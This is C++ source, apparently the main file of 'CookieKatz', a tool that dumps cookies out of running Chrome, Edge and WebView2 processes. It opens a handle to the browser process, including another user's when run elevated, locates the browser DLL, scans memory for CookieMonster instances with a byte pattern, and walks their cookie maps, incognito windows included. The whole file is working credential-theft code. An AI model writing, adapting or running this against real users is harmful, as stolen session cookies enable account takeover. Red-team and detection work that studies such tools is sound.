#include <Windows.h>
#include <shlwapi.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"
#include "Version.h"

void banner() { //This is important
    PRINT(" _____             _    _      _   __      _       \n");
    PRINT("/  __ \\           | |  (_)    | | / /     | |      \n");
    PRINT("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
    PRINT("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
    PRINT("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
    PRINT(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
    PRINT("By Meckazin                     github.com / Meckazin \n");
};

void usage() {
    PRINT("Help!\n\n");
    PRINT("Examples:\n");
    PRINT(".\\CookieKatz.exe\n");
    PRINT("    By default targets first available Chrome process\n");
    PRINT(".\\CookieKatz.exe /edge\n");
    PRINT("    Targets first available Edge process\n");
    PRINT(".\\CookieKatz.exe /pid:<pid>\n");
    PRINT("    Attempts to target given pid, expecting it to be Chrome\n");
    PRINT(".\\CookieKatz.exe /webview /pid:<pid>\n");
    PRINT("    Targets the given msedgewebview2 process\n");
    PRINT(".\\CookieKatz.exe /list /webview\n");
    PRINT("    Lists available webview processes\n");
    PRINT("\n");
    PRINT("Flags:\n");
    PRINT("    /edge       Target current user Edge process\n");
    PRINT("    /webview    Target current user Msedgewebview2 process\n");
    PRINT("    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
    PRINT("    /list       List targettable processes, use with /edge or /webview to target other browsers\n");
    PRINT("    /help       This what you just did! -h works as well\n");
}

#pragma comment(lib,"shlwapi.lib")
int main(int argc, char* argv[]) {
    banner();
	PRINT("Kittens love cookies too!\n\n");

#ifndef _WIN64
    PRINT("[-] 32bit version is not currently supported.\n");
    return 1;
#endif // !_WIN64

    TargetVersion targetConfig = Chrome;
    BOOL ProcessList = FALSE;
    DWORD pid = 0;

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "pid:") != NULL)
        {
            //Split and take pid
            const char* colonPos = strchr(argv[i], ':');
            size_t pidLen = strlen(colonPos + 1);
            char* remainder = new char[pidLen + 1];
            strcpy_s(remainder, pidLen + 1, colonPos + 1);
            if (SSCAN(remainder, "%lu", &pid) == 0) {
                PRINT("[-] Failed to parse command line argument /pid!");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "edge") != NULL)
            targetConfig = Edge;
        if (StrStrIA(argv[i], "webview") != NULL)
            targetConfig = Webview2;
        if (StrStrIA(argv[i], "list") != NULL)
            ProcessList = TRUE;
        if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            usage();
            return 0;
        }
    }

    HANDLE hProcess = NULL;
    //If some PID was given
    if (pid != 0)
    {
        if (!GetProcessHandle(pid, &hProcess))
        {
            PRINT("[-] Failed to get process handle to PID: %lu\n",pid);
            return 1;
        }
        if (!GetProcessName(hProcess, targetConfig))
        {
            PRINT("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }

        if (IsWow64(hProcess))
        {
            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hProcess);
            return 1;
        }
    }

    //0xAA is a wild card that matches any byte
    //Pattern is the implementation of the function net::CookieMonster::~CookieMonster(void)
    //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
    //Each instance of CookieMonster comes with one
    LPCWSTR targetProcess = L"\0";
    LPCWSTR targetDll = L"\0";

    if (targetConfig == Chrome || targetConfig == OldChrome || targetConfig == Chrome124)
    {
        PRINT("[*] Targeting Chrome\n");
        targetProcess = L"chrome.exe";
        targetDll = L"chrome.dll";
    }
    else if (targetConfig == Edge || targetConfig == OldEdge || targetConfig == Webview2)
    {
        if (targetConfig == Webview2) {
            PRINT("[*] Targeting Webview2\n");
            targetProcess = L"msedgewebview2.exe";
            targetDll = L"msedge.dll";
        }
        else {
            PRINT("[*] Targeting Edge\n");
            targetProcess = L"msedge.exe";
            targetDll = L"msedge.dll";
        }
    }
    else {
        PRINT("[-] Unknown config\n");
        return 0;
    }

    if (ProcessList)
    {
        PRINT("[*] Listing targetable processes\n");
        FindAllSuitableProcesses(targetProcess);
        PRINT("[+] Done\n");
        return 0;
    }

    //If pid was not given, now we go and find the process and handle
    if (pid == 0)
    {
        if (!FindCorrectProcessPID(targetProcess, &pid, &hProcess) || hProcess == NULL)
        {
            PRINT("[-] Failed to find right process\n");
            return 1;
        }

        if (IsWow64(hProcess))
        {
            PRINT("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hProcess);
            return 1;
        }
    }
#ifdef _DEBUG
    PRINTW(TEXT("[*] Targeting process PID: %d\n"), pid);
#endif

    //Versions and configs
    // 131.0.6778.0 >= Chrome
    // 125.0.6388.0 >= Chrome130
    // 125.0.6387.0 <= Chrome124
    // 124.0.6329.0 >= Chrome124
    // 124.0.6328.0 <= OldChrome

    //131.0.2903 >= Edge
    //124.0.2478 >= Edge130
    //124.0.2478 < OldEdge
    //I couldn't test that at what point Edge CanonicalCookie class was updated
    //So for now Edge doesn't support certain versions
    //Same goes for msedgewebivew2

    BrowserVersion browserVersion = { 0 };
    if (!GetBrowserVersion(hProcess, browserVersion)) {
        PRINT("[-] Failed to determine browser version!");
        return 0;
    }

    //Update config based on target version
    if (targetConfig == Chrome) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 6778)
            targetConfig = Chrome;
        else if ((browserVersion.highMajor <= 131 && browserVersion.highMinor < 6778) &&
            (browserVersion.highMajor >= 125 && browserVersion.highMinor > 6387))
            targetConfig = Chrome130;
        else if ((browserVersion.highMajor == 125 && browserVersion.highMinor <= 6387) ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor >= 6329))
            targetConfig = Chrome124;
        else if (browserVersion.highMajor <= 124 ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor < 6329))
            targetConfig = OldChrome;
    }
    else if (targetConfig == Edge || targetConfig == Webview2) {
        if (browserVersion.highMajor >= 131 && browserVersion.highMinor >= 2903)
            targetConfig = Edge;
        else if ((browserVersion.highMajor <= 131 && browserVersion.highMinor < 2903) ||
            (browserVersion.highMajor > 124))
            targetConfig = Edge130;
        else if (browserVersion.highMajor <= 124 ||
            (browserVersion.highMajor == 124 && browserVersion.highMinor < 2478))
            targetConfig = OldEdge;
    }

    //One pattern to rule them all
    size_t szPattern = 192;
    BYTE pattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    uintptr_t chromeDlladdress = 0;
    DWORD modulesize = 0;
    if (!GetRemoteModuleBaseAddress(hProcess, targetDll, chromeDlladdress, &modulesize))
    {
        PRINT("[-] Failed to find target DLL\n");
        CloseHandle(hProcess);
        return 0;
    }

#ifdef _DEBUG
    PRINTW(L"[+] Found %ls in address: 0x%p\n", targetDll, (void*)chromeDlladdress);
#endif
    uintptr_t targetSection = 0;
    if (!FindLargestSection(hProcess, chromeDlladdress, targetSection)) {
        PRINT("[-] Something went wrong");
        CloseHandle(hProcess);
        return 0;
    }

#ifdef _DEBUG
    PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
#endif
    BYTE chromeDllPattern[sizeof(uintptr_t)];
    ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

    //Patch in the base address
    PatchPattern(pattern, chromeDllPattern, 8);
    PatchPattern(pattern, chromeDllPattern, 160);

    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
    size_t szCookieMonster = 0;
    if (CookieMonsterInstances == NULL || !FindPattern(hProcess, pattern, szPattern, CookieMonsterInstances, szCookieMonster))
    {
        PRINT("[-] Failed to find pattern\n");
        CloseHandle(hProcess);
        free(CookieMonsterInstances);
        return 0;
    }

    PRINTW(TEXT("[*] Found %Iu instances of CookieMonster!\n"), szCookieMonster);
#ifdef _DEBUG
    for (size_t i = 0; i < szCookieMonster; i++)
        PRINTW(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
#endif

    //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
    //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
    for (size_t i = 0; i < szCookieMonster; i++)
    {
        if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
            break;
        uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
        CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
        PRINTW(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
#endif
        WalkCookieMap(hProcess, CookieMapOffset, targetConfig);
    }

    CloseHandle(hProcess);
    free(CookieMonsterInstances);

    PRINT("[+] Done\n");
    return 0;
}